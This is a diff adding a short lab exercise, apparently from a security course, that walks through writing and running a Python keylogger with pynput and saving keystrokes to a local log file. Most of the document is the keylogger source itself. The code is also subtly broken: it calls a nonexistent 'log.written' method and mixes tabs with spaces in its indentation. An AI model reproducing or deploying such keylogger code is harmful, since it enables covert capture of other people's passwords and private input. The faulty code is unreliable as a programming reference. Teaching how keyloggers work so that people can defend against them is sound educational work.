@@ -1,0 +1,33 @@
+AIM:- Creating a Keylogger with Python
+- Write a Python script that captures and logs keystrokes from a target system.
+- Execute the keylogger script and observe the logged keystrokes.
+- Understand the potential security risks associated with keyloggers and the importance of protecting against them.
+
+-----------------------------------------------------------------------------------------------------------------------
+
+STEP 1:- Open IDLE and type following Code.
+
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    with open("log.txt","a") as log:
+        try:
+            log.written(f"{key.char}")
+        except AttributeError:
+ 	    if key == Key.space:
+ 	        log.write(" ")
+ 	    else:
+ 	        log.write(f"{key}")
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+STEP 2:- Save the File and Run.
+
+STEP 3:- In Shell, Type anything.
+
+STEP 4:- The Keylog will be saved in a generated text file.
